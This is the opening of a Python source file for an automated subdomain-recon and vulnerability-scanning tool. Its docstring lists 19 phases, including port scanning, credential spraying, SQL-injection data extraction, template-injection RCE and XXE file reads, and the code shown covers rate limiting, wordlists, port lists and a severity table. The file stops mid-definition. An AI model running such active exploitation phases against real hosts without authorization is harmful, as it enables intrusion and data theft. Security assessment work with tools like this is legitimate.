#!/usr/bin/env python3
"""
subenum.py v9 - aggressive subdomain recon engine (19 phases, active scanning,
fully automated: no arguments -> browser dashboard -> enter target -> go)

usage:
  python subenum.py                        (browser dashboard auto-opens: enter
                                            the target in the UI, watch progress)
  python subenum.py --cli                  (interactive console prompt instead)
  echo example.com | python subenum.py     (scripted: target on stdin, full auto)
  python subenum.py magicpin.in,magicpin.com
  python subenum.py magicpin.in --nobrute --crawl 30
  python subenum.py --targets magicpin.in --wl wordlist.txt --max 50000
  python subenum.py example.com --resume          (continue interrupted run)
  python subenum.py example.com --fail-on high    (exit code 2 for CI gating)
  python subenum.py example.com --sarif --junit   (CI exports for scanning gates)
  python subenum.py example.com --csv             (findings as severity,finding CSV)
  python subenum.py example.com --delta           (diff vs last run's JSON)
  python subenum.py app.com --cookie "sid=abc" --authorization "Bearer eyJ..." (--header "X-Key: v")
  python subenum.py app.com --cookie-file cookies.txt   (name=value or Netscape export)
  python subenum.py app.com --cookie "sid=a" --auth-b "Cookie: sid=b"  (IDOR matrix)
  python subenum.py example.com --proxy http://127.0.0.1:8080  (all HTTP via proxy)
  python subenum.py example.com --resolver system --nameservers 1.1.1.1,8.8.8.8
  python subenum.py example.com --no-reverse --ptr-budget 8000 --dns-conc 500
  python subenum.py example.com --no-nuclei --nuclei-sev critical,high --sweep-ips 128
  python subenum.py --web                (dashboard on port 80 -> http://subenum;
                                          falls back to 8080+ if 80 is taken)
  python subenum.py --web 9000           (dashboard on 127.0.0.1:9000)

interactive profiles:
  full   (Enter) all 19 phases, advanced budgets - the default "just go" mode
  quick  DNS verify + probe + ports + takeover + CVE only (minutes)
  custom y/n for each check group (brute / discovery / active / nuclei / crawl)

env keys (optional, add passive sources): PD_API_KEY (projectdiscovery chaos),
  ST_API_KEY (securitytrails), VT_API_KEY (virustotal), SHODAN_KEY (shodan dns)

rate limiting (automatic): every HTTP response feeds a per-host (host:port)
  tracker - 429/503 honours Retry-After (else exponential backoff, cap 120s),
  healthy traffic decays the delay, WAF fingerprints seed a 0.15s/host pacing
  floor; backoff frees its global slot so one throttled host cannot stall others

phases (automatic, each toggleable; 6/7/8 and 11/12/13 run in parallel):
  1  passive OSINT    crt.sh, hackertarget, wayback, subdomain.center, certspotter,
                      urlscan, alienvault OTX, mnemonic pdns, rapiddns, common crawl,
                      anubis (jldc), threatminer, bufferover
                      + key-gated chaos / securitytrails / virustotal / shodan
  2  DoH brute        Google+Cloudflare + label permutations (dev-/qa/-v2 style)
  3  verify           wildcard-zone detection (DNS + HTTP baseline fingerprint) +
                      automatic retry pass; brute-only hits under a wildcard zone are
                      content-compared after probing, not blanket-dropped
  4  dns + tls        CNAME chains, apex NS/MX/TXT/SPF/DMARC/SRV -> subdomain harvest,
                      AXFR zone-transfer attempt, TLS certs -> SAN harvest,
                      expired/invalid cert detection, dangling-CNAME detection
  4b reverse+netblock PTR harvest for every live IP, /24 sweeps around them,
                      RIPEstat org-netblock sampling, reverse-IP lookups -> new names
  5  http probe       status/title/server/tech/security headers/takeover fingerprints,
                      login-form clickjacking + root directory-listing detection,
                      mixed-content, login-CSRF token presence, OAuth state,
                      sensitive HTML-comment leaks, third-party script SRI check,
                      Permissions-Policy header, plaintext login-form and
                      HTTP-Basic-over-http challenge detection,
                      IIS 8.3 shortname disclosure,
                      wildcard content filtering runs against these results
  6  deep crawl       BFS same-host crawl + endpoint/secret mining + cookie/CORS/method checks
  7  port scan        async TCP connect + banner grab + anonymous FTP login +
                      unauthenticated service probes (docker/elastic/redis/
                      memcached/etcd/rsync) (parallel with 6 and 8)
  8  endpoints        wayback harvest (parallel with 6 and 7)
  9  secrets          live pages + crawled JS + archived wayback JS + source maps
                      + sensitive file leaks + robots.txt hidden-path
                      disclosure + .DS_Store entry parsing
                      + static client-side bug scan (DOM-XSS source->sink flow,
                      postMessage handlers without event.origin validation)
  10 takeover         confirm dangling CNAMEs against HTTP fingerprints
  11 content discovery dir/file brute w/ soft-404 baseline -> hidden panels & files,
                      directory-listing detection, 403 path-variant bypass checks
  12 vhost brute      Host-header wordlist vs shared IPs -> default-vhost leaks
  13 api spec         swagger/openapi harvest + GraphQL introspection (read-only query)
  14 method matrix    OPTIONS/TRACE/PROPFIND on live targets
  15 surface + CVE    emails/phones/internal-ips/params harvest, banner+JS-lib CVE match,
                      EOL software, WAF/CDN edge map, CAA (issue-value
                      checked) + MTA-STS DNS hardening incl. the
                      mta-sts.<domain> policy-file fetch (mode: enforce),
                      DNSSEC NSEC zone-walk
  --- active scanning -------------------------------------------------------
  16 params           DAST-lite: open-redirect (+ //, /\\, \\/ bypass payloads)
                      / reflected XSS (context + double/single-quote breakout
                      proof) / SSTI (engine fingerprint + RCE exploit + User-Agent,
                      Cookie, Referer header channels) / SQLi (error,
                      boolean-blind, time-blind + error-based version/db/user
                      extraction, extractvalue + FLOOR(RAND)) / NoSQLi / XPath /
                      LDAP injection / OS command injection / SSI / shellshock
                      / CRLF header
                      injection / JSONP callback / prototype pollution / XXE
                      (POST entity expansion + file read) / GraphQL batching /
                      host header injection / auth-bypass edge header tricks /
                      SSRF / path traversal (+ win.ini, .env, WEB-INF/web.xml,
                      php://filter source leak) + verbose stack-trace
                      disclosure, backup source files (.bak/.old/~/.swp),
                      missing rate limits on auth endpoints, default Basic
                      credentials, cross-site websocket hijacking (CSWSH),
                      method-override header honoring, javascript:/data:
                      redirect schemes and secrets transmitted in query
                      strings - evidence-based probes
                      + SMTP VRFY/RCPT mailbox enumeration (uniform server
                      replies produce no finding - only a control-vs-candidate
                      differential counts)
                      + unauthenticated canary PUT/DELETE write checks
                      (PUT must persist and GET-verify; DELETE must show
                      verified removal - no resource is ever touched)
                      + login username enumeration (two random users must be
                      stable first; a differing candidate proves disclosure)
                      / HTTP Parameter Pollution (both duplicate canaries
                      reflected) / email header injection (control must
                      reflect before an injected Bcc counts)
                      + unauthenticated sequential-object IDOR (neighbor id
                      readable with a differing body, control id rejected)
                      / OAuth redirect_uri allowlist canary (3xx Location
                      to the external host) / time-based ReDoS (both evil
                      runs slow vs a fast control) / open-relay + STARTTLS
                      health on the primary MX (SMTP; RSET/QUIT only, no
                      DATA is ever sent)
  17 tls config       TLS1.0/1.1 support, weak cipher suites, static-RSA key
                      exchange (ROBOT surface), RSA key size, MD5/SHA1 cert sigs
  18 netblock sweep   port-scan + banner + PTR on IPs inside org-owned netblocks
                      (non-cloud ASNs only) -> shared-infra mapping + new names
  19 nuclei           projectdiscovery nuclei engine (auto-downloads binary +
                      templates on first use) -> CVE/template findings by severity

outputs:
  subdomains.txt / _links / _endpoints / _crawl / _ports / _dirs / _vhosts /
  _surface / _findings / .json
  subdomains_report.html    severity-grouped + per-host HTML report, per-tag
                            remediation hints, by-type summary table
  subdomains.state.json     checkpoint, saved after phases 3/5/15 (used with --resume)
  subdomains.sarif          (--sarif) SARIF 2.1.0 for GitHub code scanning
  subdomains_junit.xml      (--junit) JUnit XML for CI test gates
  subdomains.csv            (--csv) findings as severity,finding CSV
  .subenum_history.json     (web dashboard) last 20 finished scans - browse,
                            re-open and export them from the Recent scans list
  subdomains_diff.txt       (--baseline OLD.json / --delta) +new/-resolved
                            hosts and findings since the baseline run
  webhook JSON              (--webhook URL) POST {severity counts,
                            critical_high[], files{}} after the run

json schema (schema_version 1; keys are additive-only, never renamed/removed):
  schema_version int   targets [str]        elapsed float    count int
  hosts [{host, ip, cname, scheme, status, title, tech, ...}]
  apex_records {}      findings [str]       severity {sev: int}   endpoints int
  crawl_pairs int      mined int            ports [{host, port, banner}]
  dangling {}          certs {}             dir_hits / vhost_hits / api_hits /
                                             method_hits int (hit counts)
  cves [str]           cdn {host: [tag]}    surface {emails, phones,
                                             internal_ips, sens_params}
"""
import asyncio, aiohttp, re, sys, time, os, argparse, json, base64, ssl, html, ipaddress, hmac, hashlib, struct, secrets
import shutil, zipfile, platform, socket, subprocess, tempfile, io, random, gzip, glob
import xml.etree.ElementTree as ET
from collections import deque, Counter
from aiohttp import web
from urllib.parse import urlsplit, urljoin, quote, unquote
from email.utils import parsedate_to_datetime
if sys.platform == "win32":
    # proactor loop spams WinError 10022 tracebacks on transport close;
    # the selector loop avoids it and works fine with aiohttp
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

try:
    import dns.asyncresolver, dns.resolver, dns.exception, dns.query
    HAVE_DNSPY = True
except Exception:
    HAVE_DNSPY = False

import warnings
# phase 17 intentionally negotiates deprecated TLS versions
warnings.filterwarnings("ignore", message=r"ssl\.TLSVersion\.", category=DeprecationWarning)

DNS_SEM = asyncio.Semaphore(300)
SYS_SEM = asyncio.Semaphore(60)
HTTP_SEM = asyncio.Semaphore(120)
PORT_SEM = asyncio.Semaphore(400)
FAILS = [0]
# W5 - aggregated check failures: return_exceptions=True gathers used to print
# and forget; these are surfaced in /api/stats, the end-of-scan summary and the
# smoke gate (smoke_final.py fails the run when non-empty).
CHECK_ERRORS = []          # [(tag, message)] - capped, per-run
_CHECK_ERR_CAP = 200


def record_error(tag, msg):
    if len(CHECK_ERRORS) < _CHECK_ERR_CAP:
        CHECK_ERRORS.append((str(tag), str(msg)[:300]))


def note_check_error(tag, msg):
    """record + print a check failure (exact legacy `  [tag] msg` line)."""
    record_error(tag, msg)
    print(f"  [{tag}] {msg}", flush=True)

RESOLVER_MODE = "auto"
SYS_RES = None
DOH = ["https://dns.google/resolve?name={h}&type={t}",
       "https://cloudflare-dns.com/dns-query?name={h}&type={t}",
       "https://dns.adguard-dns.com/resolve?name={h}&type={t}"]
DNS_PER_HOST = 5   # simultaneous queries per DoH endpoint (routers drop bursts of
                   # new TLS connections to one destination; keep-alive then reuses them)
DOH_PRESSURE = [0.0] * len(DOH)      # epoch: each endpoint pauses until this time
DOH_SLOTS = [asyncio.Semaphore(DNS_PER_HOST) for _ in DOH]
DTYPE = {"A": 1, "NS": 2, "CNAME": 5, "PTR": 12, "MX": 15, "TXT": 16, "SRV": 33}
SRV_QRY = ("_caldavs._tcp", "_carddavs._tcp", "_submission._tcp", "_imaps._tcp",
           "_ldaps._tcp", "_sip._tcp", "_xmpp-client._tcp")
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36"}
AUTH_HEADERS = {}          # --cookie / --authorization / --header (target requests only)


def build_auth(cookie="", cookie_text="", authorization="", header_list=()):
    """merge CLI auth inputs into session headers (Cookie / Authorization / custom)."""
    out, jar = {}, []
    if cookie and cookie.strip():
        jar.append(cookie.strip().rstrip(";"))
    for line in (cookie_text or "").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "\t" in line:                          # Netscape cookie.txt row
            parts = line.split("\t")
            if len(parts) >= 7 and parts[5]:
                jar.append(f"{parts[5]}={parts[6]}")
        elif "=" in line:
            jar.append(line)
    if jar:
        out["Cookie"] = "; ".join(x for x in jar if x)
    if authorization:
        out["Authorization"] = authorization.strip()
    for h in header_list or ():
        if ":" in h:
            k, v = h.split(":", 1)
            if k.strip():
                out[k.strip()] = v.strip()
    return out


_RATE = {}          # "host:port" -> {until: epoch, delay: s, ok: n, floor: s}
_RATE_CAP = 120.0   # max single backoff wait (seconds)


def _rate_key(url):
    try:
        u = urlsplit(str(url))
        port = u.port or (443 if u.scheme == "https" else 80)
        return f"{u.hostname or ''}:{port}"
    except Exception:
        return str(url)


def rate_seed(key, floor=0.15):
    """minimum inter-request pacing for a host (WAF / known-sensitive targets)."""
    st = _RATE.get(key)
    if st is None:
        st = _RATE[key] = {"until": 0.0, "delay": 0.0, "ok": 0, "floor": 0.0}
    st["floor"] = max(st.get("floor", 0.0), floor)


def rate_note(key, status, headers=None):
    """record a response: 429/503 -> backoff (Retry-After aware), 2xx/3xx -> decay."""
    st = _RATE.get(key)
    if st is None:
        if status not in (429, 503):
            return
        st = _RATE[key] = {"until": 0.0, "delay": 0.0, "ok": 0, "floor": 0.0}
    now = time.time()
    if status in (429, 503):
        wait, ra = None, str((headers or {}).get("Retry-After", "")).strip()
        if ra:
            if ra.isdigit():
                wait = float(ra)
            else:
                try:
                    wait = parsedate_to_datetime(ra).timestamp() - now
                except Exception:
                    wait = None
        if wait is None or wait <= 0:
            wait = max(st.get("delay", 0.0) * 2.0, 2.0)
        wait = min(max(wait, 1.0), _RATE_CAP)
        st["delay"] = max(wait, st.get("floor", 0.0))
        st["until"] = now + st["delay"]
        st["ok"] = 0
    else:
        st["ok"] = st.get("ok", 0) + 1
        if st["ok"] >= 25:
            st["ok"] = 0
            st["delay"] = max(st.get("delay", 0.0) * 0.5, st.get("floor", 0.0))
        st["until"] = now + max(st.get("delay", 0.0), st.get("floor", 0.0))


async def _rate_sleep(session, ctx, params):
    st = _RATE.get(_rate_key(params.url))
    if not st:
        return
    t = st.get("until", 0.0) - time.time()
    if t <= 0:
        return
    sem = HTTP_SEM          # free the global slot while we wait so one
    sem.release()           # throttled host cannot stall every other target
    try:
        await asyncio.sleep(min(t + random.uniform(0.0, 0.3), _RATE_CAP + 1.0))
    finally:
        await sem.acquire()


async def _rate_watch(session, ctx, params):
    try:
        rate_note(_rate_key(params.response.url), params.response.status,
                  params.response.headers)
    except Exception:
        pass


_RATE_TRACE = aiohttp.TraceConfig()
_RATE_TRACE.on_request_start.append(_rate_sleep)
_RATE_TRACE.on_request_end.append(_rate_watch)


PROXY = ""               # --proxy: every HTTP(S) request is sent through this URL


class _ProxySession(aiohttp.ClientSession):
    """ClientSession that routes requests through PROXY when set.

    Injected at the _request funnel (get/post/ws all pass through it); an
    explicit proxy= from a caller always wins so one request can bypass."""

    async def _request(self, method, url, **kwargs):
        if PROXY and kwargs.get("proxy") is None \
                and str(url).lower().startswith(("http://", "https://")):
            kwargs["proxy"] = PROXY
        return await super()._request(method, url, **kwargs)


def tsession(conn=None):
    """session for requests to the TARGET: carries auth headers when configured.
    passive / DNS / third-party sessions keep using plain_session."""
    return _ProxySession(connector=conn or aiohttp.TCPConnector(limit=0),
                         headers=dict(AUTH_HEADERS) or None,
                         trace_configs=[_RATE_TRACE])


def xsession(conn=None):
    """traced plain session for third-party sources (no target auth headers);
    429/503 backoff still applies so shared OSINT providers are not hammered."""
    return _ProxySession(connector=conn or aiohttp.TCPConnector(limit=0),
                         trace_configs=[_RATE_TRACE])


def plain_session(conn=None):
    """session for passive sources / DoH / helpers (no auth headers)."""
    return _ProxySession(connector=conn or aiohttp.TCPConnector(limit=0))
HOST_RE = re.compile(r"[a-z0-9][a-z0-9\-]{0,62}(?:\.[a-z0-9][a-z0-9\-]{0,62})+\.[a-z]{2,}")
TARGET_RE = re.compile(r"(?:[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}")
TITLE_RE = re.compile(rb"<title[^>]*>(.*?)</title>", re.I | re.S)
JS_RE = re.compile(rb"""<script[^>]+src=["']([^"']+)["']""", re.I)

DEFAULT_WORDS = """admin api app auth beta blog bot brand cdn cms crm demo dev docs
download ftp git grafana help helpdesk hr img internal jenkins jira kb mail mcp media
merch merchant mobile mx news ns ns1 ns2 partner partners pay payment payments pg
portal prod profile promo qa redis remote repo reports root sandbox search secure
server shop smtp sso staging static status store support test testing upload users
vpn web webmail wiki www www1 www2 analytics sentry buzz mag ops if gc zero phab
pentaho xmpp starlink gigafactory vulcan yoda argocd coach crawling discourse
samara vera velocity gullak orderhere locality crmapi autobot b2b msg parser elvis
jedi sherlock skynet hop n8n sftp cbs wa kd chat delivery bugs""".split()

EXTRA_WORDS = """backups billing click cloud cluster cmd console contractor dashboard
data db deploy developer direct dl edge elasticsearch events exchange extranet files
filter firewall form forms forum forums frontend global host hosting identity imap
inbound index info ingest inventory jobs kibana ldap legacy license link live logs
login logout mail1 mail2 marketing metrics mfa monitoring nfs owa panel pipeline
platform pop preview printer project projects public publishing queue retail rest
routing s3 saas sales scim services share signup sip source sql ssl stats stream
subscribe temp terminal uptime video voip web1 wp xml actuator airflow apigw
auth0 backstage bitbucket bluejeans buildly bamboo carbon chown ci circle checkout
chrome console2 cypress datadog discourse2 dockerhub dremio dropbox dubna eureka
fabric fastly fetch fhir gcp gitlab gke gogs grafana2 gunicorn hasura herokuapp
hcloud honeycomb host2 hyperv immich influxdb istio jenkins2 jitsi kafka keycloak
kibana2 knative kong kubernetes kustomize lark laravel letsencrypt librenms libre
linkerd logstash loki mailgun mautic meson metrics2 microk8s milvus minio mistral
mongod monitor mta myaccount netlify nginx2 nomad npm nuxt oauth office okta onprem
openapi opensearch openshift openvpn operator otel outpost ovpn packer paas pager
patroni pgaudit phab2 phpmyadmin pomerium portainer postgres preprod prometheus
pulsar quay rabbitmq rancher raw react2 realm redash redis2 registry rest2 rpc
ruby rust runner salesforce salt samana sap scalyr scope sentry2 serverless
servicenow shadow shopify shuttle sigma simulation skaffold slack smarthost snow
splunk spring spinnaker square ssh2 sso2 stack stacks statsd stitch storage
streamlit stripe stryker subversion surge swift synology tado telemetry tempo
terraform thanos thebuggenie thumbor tines tomcat traefik tray trell trex trino
tunnel twilio uat ui unity velero vent vercel victoriametrics vite vite2 voicemail
vscode vault vaultwarden vault2 verifone vpn2 waf webapi webflow webrick websockets
whitesource wiki2 windmill wordpress2 wso2 xdebug xray xen yaml youtrack zabbix
zalando zerodha zimbra zoom zulip""".split()

PARENT_ZONES = ["gc", "ops", "api", "staging", "dev", "test", "app", "if", "mcp", "crm"]
MUT_PFX = ["dev", "stg", "qa", "uat", "stage", "staging", "prod", "test", "demo", "old",
           "new", "beta", "int", "internal", "edge", "gw", "web", "app", "api", "ftp",
           "mail", "cdn", "admin", "portal", "auth", "sso", "vpn", "db", "redis", "mq",
           "node", "srv", "server", "v2", "v3", "canary", "backup", "old"]
MUT_SFX = ["dev", "test", "stg", "stage", "prod", "uat", "qa", "1", "2", "3", "01",
           "02", "new", "old", "v2", "v3", "canary"]

DEFAULT_PORTS = (21, 22, 23, 25, 53, 80, 81, 110, 143, 389, 443, 445, 465, 587, 993, 995,
                 1433, 1521, 1883, 2049, 2181, 2375, 2379, 3000, 3306, 3389, 4190, 4443,
                 5000, 5432, 5601, 5672, 5900, 5984, 6379, 6443, 7001, 7474, 8000,
                 8008, 8009, 8080, 8081, 8088, 8161, 8200, 8443, 8500, 8848, 8888, 8983, 9000, 9090,
                 9092, 9200, 9300, 9870, 10250, 1099, 11211, 15672, 27017, 27018, 28017,
                 50070)
RISK_PORTS = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 445: "SMB",
              389: "LDAP", 1433: "MSSQL", 1521: "Oracle", 1883: "MQTT",
              2181: "ZooKeeper", 2375: "Docker-API", 8009: "AJP",
              3306: "MySQL", 3389: "RDP", 5432: "Postgres", 5601: "Kibana",
              5672: "AMQP", 5900: "VNC",
              6379: "Redis", 6443: "K8s-API", 7001: "WebLogic", 7474: "Neo4j",
              8161: "ActiveMQ", 8200: "Vault",
              8500: "Consul", 8848: "Nacos", 8983: "Solr", 9090: "Prometheus",
              9092: "Kafka", 9200: "Elasticsearch", 9870: "Hadoop-NN",
              10250: "Kubelet", 1099: "RMI/JMX", 11211: "Memcached",
              15672: "RabbitMQ-Mgmt", 27017: "MongoDB", 50070: "Hadoop-NN"}
HTTPISH = {80, 81, 443, 3000, 4443, 5000, 5601, 5984, 6443, 7001, 7474, 8000, 8008,
           8080, 8081, 8088, 8161, 8200, 8443, 8500, 8848, 8888, 8983, 9000, 9090, 9200,
           9870, 10250, 15672, 2375, 50070}
GREET = {6379: b"PING\r\n", 11211: b"version\r\n"}
# banner corroboration for PORT-RISK: defined regex = a mismatching banner
# proves the port is NOT running the assumed service (downgrade to PORT);
# empty bytes = silent service, cannot refute. empty sig = no known banner.
RISK_SIG = {
    21: rb"(?i)^220",
    22: rb"(?i)^ssh-",
    23: rb"(?i)login:|telnet|escape char",
    25: rb"(?i)^220",
    445: rb"",
    389: rb"",
    1433: rb"",
    1521: rb"",
    1883: rb"",
    2181: rb"(?i)zookeeper",
    2375: rb"(?i)^http/",
    3306: rb"(?i)mysql|mariadb",
    3389: rb"\x03\x00",
    5432: rb"",
    5601: rb"(?i)^http/",
    5672: rb"",
    5900: rb"(?i)^rfb ",
    6379: rb"(?i)p.?ong|redis",
    6443: rb"(?i)^http/|kubernetes",
    7001: rb"",
    7474: rb"(?i)^http/",
    8009: rb"",
    8161: rb"(?i)^http/",
    8200: rb"(?i)^http/",
    8500: rb"(?i)^http/",
    8848: rb"(?i)^http/",
    8983: rb"(?i)^http/",
    9090: rb"(?i)^http/",
    9092: rb"",
    9200: rb"(?i)^http/|elastic",
    9870: rb"(?i)^http/",
    10250: rb"(?i)^http/|kube",
    1099: rb"",
    11211: rb"(?i)version|memcache",
    50070: rb"(?i)^http/",
    15672: rb"(?i)^http/",
    27017: rb"",
}

SEV = {"PORT-RISK": "critical", "TAKEOVER-CONFIRMED": "critical", "LEAK": "critical",
       "CVE-CRIT": "critical", "AXFR": "critical", "SECRET": "high",
        "CORS-REFLECT": "high", "CORS-WIDE": "low", "CORS-OPEN": "medium",
        "CORS-NULL": "medium",
       "PARAM-XSS": "high", "PARAM-SSTI": "high", "PARAM-SSRF": "high",
       "PARAM-TRAV": "high", "PARAM-SQLI": "high", "WEAKCIPHER": "high",
       "TLS-SMALLKEY": "high",
       "CERT-EXPIRED": "high", "CERT-INVALID": "medium", "TAKEOVER-DANGLING": "high",
       "DIR-CRIT": "high", "GRAPHQL": "high", "WEBDAV": "high", "JS-CVE": "high",
       "PUT-ALLOWED": "high", "LOGIN-PLAIN": "high",
       "CVE-HIGH": "high", "METHODS": "medium", "COOKIE": "medium", "TAKEOVER": "medium",
       "TAKEOVER-RISK-CNAME": "medium", "PORT": "medium", "CERT-EXP-SOON": "medium",
       "DIR-HOT": "medium", "VHOST": "medium", "VHOST-DEFAULT": "medium",
       "API-SPEC": "medium", "TRACE": "medium", "INTERNAL-IP": "medium",
       "JWT-NONE": "high", "BUCKET-OPEN": "high", "GQL-DANGEROUS": "high",
       "DOM-XSS": "high",
       "SSRF-METADATA": "critical", "CACHE-POISON": "high", "IDOR": "high",
        "SMUGGLING": "medium", "USER-ENUM": "medium",
        "DELETE-ALLOWED": "medium", "LOGIN-ENUM": "medium",
        "EMAIL-INJECT": "medium", "PM-ORIGIN": "medium",
       "SQLI-EXTRACT": "critical", "PARAM-CMDI": "critical",
       "PARAM-SQLI-TIME": "high", "PARAM-NOSQLI": "high", "PARAM-SOURCE": "high",
        "XXE": "high", "XXE-READ": "critical", "SSTI-RCE": "critical",
        "AUTH-BYPASS": "critical", "HOST-INJECT": "high",
        "XPATHI": "high", "LDAPI": "high",
        "JSONP": "medium", "PROTO-POLLUTION": "high", "GQL-BATCH": "medium",
        "DIRLIST": "medium", "DSSTORE": "medium", "SOURCEMAP": "medium",
        "ERRTRACE": "medium", "CLICKJACK": "medium", "RATELIMIT": "medium",
        "BACKUP": "high", "AUTH-DEFAULT": "critical",
        "PARAM-SSI": "high", "SHELLSHOCK": "critical", "PATH-BYPASS": "high",
        "JWT-WEAK": "high", "CSWSH": "medium", "FTP-ANON": "medium",
        "SVC-DOCKER": "critical", "SVC-REDIS": "critical",
        "SVC-PG": "critical", "SVC-VNC": "critical", "SVC-K8S": "critical",
        "SVC-ELASTIC": "high", "SVC-MEMCACHED": "high", "SVC-ETCD": "high",
        "SVC-MQTT": "high", "SVC-COUCH": "high",
        "SVC-RSYNC": "medium", "SVC-ZK": "medium", "MTHD-OVERRIDE": "medium",
        "LOGIN-CSRF": "medium",
        "MIXED-CONT": "medium", "OAUTH-STATE": "medium", "COMMENT-LEAK": "medium",
        "IIS-SHORTNAME": "medium", "JWT-JKU": "medium", "PARAM-SECRET": "high",
       "CSP-WEAK": "medium", "CSP-REPORT": "medium", "JWT-ADMIN": "medium",
        "JWT-KID": "medium", "SMTP-TLS": "medium", "JWT-EXP": "medium",
        "SMTP-NULL-RELAY": "medium",
       "SMTP-RELAY": "critical", "BUCKET-WRITE": "critical",
       "OAUTH-REDIR": "high", "REDOS": "high", "AUTH-PLAIN": "high",
        "MTA-STS-FILE": "low", "ROBOTS-LEAK": "low", "CERT-LONGVALID": "low",
       "PARAM": "medium", "CVE-MED": "medium", "EOL": "low",
       "PARAM-REDIRECT": "medium", "PARAM-CRLF": "medium",
       "TLS10": "medium", "TLS11": "medium", "WEAKKEY": "medium",
       "WEAKSIG": "medium", "SWEEP-RISK": "medium",
       "TLS-RSAKEX": "low", "NUCLEI-LOW": "low",
        "HEADERS": "low", "SPF-MISSING": "low", "DMARC-MISSING": "low",
        "SPF-OPEN": "low", "DMARC-WEAK": "low", "DMARC-NOREPORT": "low",
        "DNSSEC-MISSING": "low",
       "SRI-MISSING": "low", "CAA-MISSING": "low", "MTA-STS-MISSING": "low",
       "NSEC-WALK": "medium", "HPP": "low",
       "CSP": "low",
        "DIR": "info", "EMAIL": "info", "PHONE": "info", "WILDCARD": "info",
        "SWEEP": "info", "NUCLEI-INFO": "info", "JWT": "info",
        "BUCKET": "info", "WAF": "info", "WS": "info",
        "NUCLEI-CRIT": "critical", "NUCLEI-HIGH": "high", "NUCLEI-MED": "medium",
        "H2C": "low", "H3-QUIC": "info", "CMDI-HEADER": "high",
        "CMS-CFG-BAK": "critical", "CMS-XMLRPC": "high",
        "CMS-DEBUGLOG": "high", "CMS-VER-DISC": "low",
        "SVC-KUBELET": "critical", "SVC-MONGO": "critical",
        "SVC-CONSUL": "high", "SVC-NACOS": "high", "SVC-SOLR": "high",
        "SVC-REGISTRY": "high", "SVC-RABBIT": "high", "SVC-JENKINS": "high",
        "RDP-LEGACY": "medium", "GQL-SUGGEST": "medium", "API-DUMP": "high",
        "PHPUNIT-RCE": "critical", "GHOSTCAT": "critical", "SVC-LDAP": "high",
        "JWT-NONE-ACCEPT": "high", "JWT-JWK": "high", "SSRF-BYPASS": "high",
        "SVC-RMI": "medium", "GQL-COST": "medium",
        "JWT-ALGCONF": "critical", "LOG4J-LOOKUP": "critical",
        "SHELL-EXEC": "critical", "JOLOKIA": "high",
        "OAUTH-TOKEN-URL": "high", "DEBUG-CONSOLE": "high",
        "DEBUG-TOOLBAR": "medium", "CORS-REDIR": "medium",
        "TABNAB": "low",
        "SVC-KAFKA": "high", "SVC-PROMETHEUS": "high", "SVC-NEO4J": "critical",
        "SVC-ACTIVEMQ": "medium", "SVC-HADOOP": "high",
        "TOMCAT-DEFAULT": "critical", "ACTUATOR": "medium",
        "OAUTH-PKCE": "medium", "PHPINFO": "high",
        "JENKINS-RCE": "critical", "CONSUL-KV": "critical",
        "ETCD-KV": "critical", "GRAFANA-DATA": "critical",
        "MYSQL-EMPTY": "critical", "SVC-WEBLOGIC": "medium",
        "WP-USER-ENUM": "medium", "OAUTH-IMPLICIT": "medium",
        "API-DOCS": "medium",
        "ACTUATOR-ENV": "critical", "ACTUATOR-HEAPDUMP": "critical",
        "H2-CONSOLE": "high", "ELMAH": "high", "TRACE-AXD": "medium",
        "VAULT-MOUNTS": "critical", "CONFIG-LEAK": "high",
        "NACOS-USERS": "high", "WP-REST-USERS": "medium",
        "JENKINS-DEFAULT": "medium", "JUPYTER-OPEN": "critical",
        "AIRFLOW-DAGS": "high",
        "ADMINER": "high", "PMA-EXPOSED": "medium", "SERVER-INFO": "medium",
        "JBOSS-INVOKER": "critical", "JBOSS-CONSOLE": "high",
        "IMAP-EMPTY": "medium", "POP3-EMPTY": "medium",
        "FTP-DEFAULT": "medium", "REDIS-WEAK": "high",
        "RABBIT-DEFAULT": "medium",
        "AMQP-DEFAULT": "high", "MQTT-DEFAULT": "medium",
        "PG-DEFAULT": "critical", "SMTP-DEFAULT": "medium",
         "RATELIMIT-BYPASS": "high",
         "FIREBASE-DB": "critical", "FIREBASE-STORAGE": "high",
         "SQLI-FILE-READ": "critical", "WP-CONFIG-READABLE": "critical",
         "MASS-ASSIGN": "high", "SPRAY-DEFAULT": "high", "VNC-WEAK": "high",
         "SNMP-PUBLIC": "medium", "MEMCACHED-UDP": "medium",
         "WP-PLUGIN-VER": "low",
         # ---- wave 21: protocol / session / auth / logic / supply-chain / deser ----
         "H2-DESYNC": "critical", "H3-DOWNGRADE": "medium",
         "WS-SMUGGL": "high", "DOWNGRADE": "medium",
         "SESS-FIXATION": "high", "CSRF-MISSING": "medium",
         "BOLA-SWEEP": "high", "METHOD-BYPASS": "high",
         "ATO-CHAIN": "critical", "DESER": "critical",
         "RACE-CONF": "high", "BULK-EXPOSURE": "medium",
         "JS-SUBTAKEOVER": "medium", "POSTMESSAGE-ORIGIN": "medium",
         "PROTO-SINK": "high", "SSTI-CONFIRM": "high",
         "CSRF-STATE": "medium", "SESSION-ROTATION": "medium",
          # ---- wave 22: known-credential brute + business logic ----
          "SPRAY-KNOWN": "critical",
          "BIZ-PRICE": "critical", "BIZ-COUPON": "high",
          "BIZ-WORKFLOW": "high", "BIZ-QUOTA": "medium",
          # ---- wave 24: HTTP method expansion ----
          "TRACK": "medium", "DEBUG-METHOD": "medium",
          "SEARCH-ALLOWED": "medium", "MKCOL-ALLOWED": "high",
          "MOVE-ALLOWED": "high", "CONNECT-PROXY": "high",
          # ---- wave 25: AI/LLM API surface ----
          "LLM-ENDPOINT": "info", "LLM-OPEN": "medium"}

# methods that should never be advertised on a hardened origin (wave 24)
DANGEROUS_METHODS = ("PUT", "DELETE", "PATCH", "TRACE", "TRACK", "DEBUG",
                     "MOVE", "COPY", "MKCOL", "LOCK", "UNLOCK", "SEARCH",
                     "CONNECT", "ACL", "REPORT", "LABEL", "MERGE",
                     "MKACTIVITY", "ORDERPATCH", "PROPPATCH", "PURGE")

# ---------------- fingerprints ----------------
TECH = {
    "Grafana":       [b"grafana", b"Grafana"],
